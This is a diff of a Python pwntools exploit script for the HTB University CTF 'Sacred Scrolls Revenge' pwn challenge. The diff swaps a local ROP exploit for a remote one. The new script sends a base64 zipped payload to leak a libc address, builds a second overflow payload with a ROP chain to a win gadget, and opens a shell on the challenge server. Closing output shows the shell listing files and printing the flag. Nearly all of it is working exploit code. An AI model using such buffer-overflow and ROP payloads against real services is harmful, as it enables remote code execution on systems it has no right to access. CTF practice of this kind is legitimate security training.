@@ -1,51 +1,94 @@
+#https://hiumee.com/posts/HTB-University-CTF-Sacred-Scrolls-Revenge/
+
 from pwn import *
-import base64
-import os
+from os import system
 
-context.arch = 'amd64'
+# Pre-made payload to avoid `/` characters in it
+# Payload: + padding + RBP + POP_RDI + GOT[system] + PLT[puts] + RET + RET + MAIN + padding
+# RPB = 0
+# RET + RET and final padding is used to change the base64 output to avoid `/`
+# 2 RET instructions are used to keep the stack alignment
+payload_leak = b"UEsDBBQAAAAIAK1ag1V0l2o0MgAAAGUAAAAJABwAc3BlbGwudHh0VVQJAAMVFYtjFRWLY3V4CwABBOgDAAAE6AMAAPswf+LkR7MWJmIHaVEMULBZ0AFMT9BPgAhwQPjn2FHpR3wQ2rEqNanIwMDEwCDNwBIAUEsBAh4DFAAAAAgArVqDVXSXajQyAAAAZQAAAAkAGAAAAAAAAAAAAP+BAAAAAHNwZWxsLnR4dFVUBQADFRWLY3V4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE8AAAB1AAAAAAA="
 
-elf = ELF('./sacred_scrolls')
-libc = ELF('./glibc/libc.so.6')
+libc_system = 0x50d60
+win_addr = 0xebcf5
+win_diff = libc_system - win_addr
+data_section = 0x603000
 
-padding = 'A'*(40)
+#io = process("./sacred_scrolls")
+ip, port = "139.59.170.23", 32060
+io = remote(ip, port)
 
-io = process('./sacred_scrolls')
-#ip, port = "144.126.232.205", 32161
-#io = remote(ip, port)
+io.recvuntil(b"tag: ") # Tag - anything
+io.sendline(b"1")
 
-io.sendlineafter('Enter your wizard tag:','1')
-io.sendlineafter('>>', '1')
+io.recvuntil(b">> ") # Select upload
+io.sendline(b"1")
 
-pop_rdi_ret = 0x00000000004011b3
-puts_addr = 0x0000000000602f80
-ret = 0x00000000004007ce
+io.recvuntil(b": ") # Send first payload
+io.sendline(payload_leak)
 
-server_libc_base = puts_addr - libc.symbols['puts']
-log.info("Leaked server's libc base address: "+hex(server_libc_base))
+io.recvuntil(b">> ") # Read - load payload in memory
+io.sendline(b"2")
 
-libc.address = server_libc_base
+io.recvuntil(b">> ") # Exit - execute payload
+io.sendline(b"3")
 
-#payload2: get the shell
-rop_libc = ROP(libc)
-#rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
-rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
-payload2 = padding + p64(ret) + rop_libc.chain()
+io.recvuntil(b"saved!")
+io.recvline()
+leak = io.recvline().strip()
 
-with open('spell.txt', 'wb') as f:
-        f.write(payload2)
-os.system('zip spell0.zip spell.txt')
-os.system('rm -f spell.txt')
-payload = os.popen('cat spell0.zip').read()
+while len(leak) < 8: # Pad leak with null bytes
+	leak = leak + b"\x00"
 
-io.sendlineafter('[*] Enter file (it will be named spell.zip):', base64.b64encode(payload))
-print base64.b64encode(payload)
-print io.sendlineafter('>>', '2')
-print io.sendlineafter('>>', '3')
-io.recvuntil('\n')
-io.recvuntil('\n')
+print(u64(leak))
+win_addr = u64(leak) - win_diff
 
-io.interactive()
+
+header = b"\xf0\x9f\x91\x93\xe2\x9a\xa1" + b"a"*25
+#header = b"a"*32
+rop = p64(data_section + 0x78) + p64(win_addr)
+payload = header + rop
+
+system("rm spell.zip && rm spell.txt 2>/dev/null")
+
+open("spell.txt", 'wb').write(payload)
+command = f"zip spell.zip spell.txt && cat spell.zip | base64 > payload"
+system(command)
+
+payload = open("payload").read().replace("\n", "")
+
+system("rm spell.txt payload spell.zip")
+
+if "/" in payload:
+	print("Try again. The payload happened to be invalid")
+	exit()
+
+io.recvuntil(b"tag: ") # Tag - anything
+io.sendline(b"1")
+
+io.recvuntil(b">> ") # Select upload
+io.sendline(b"1")
+
+io.recvuntil(b": ") # Send second payload
+io.sendline(payload)
+
+io.recvuntil(b">> ") # Read - load payload in memory
+io.sendline(b"2")
+
+io.recvuntil(b">> ") # Exit - execute payload
+io.sendline(b"3")
+
+io.interactive() # RCE
 
 '''
-
+[-] This spell is not quiet effective, thus it will not be saved!
+$ ls
+flag.txt
+glibc
+sacred_scrolls
+spell.txt
+spell.zip
+$ cat flag.txt
+HTB{s1gn3ed_sp3ll5_fr0m_th3_b01_wh0_l1v3d}
 '''
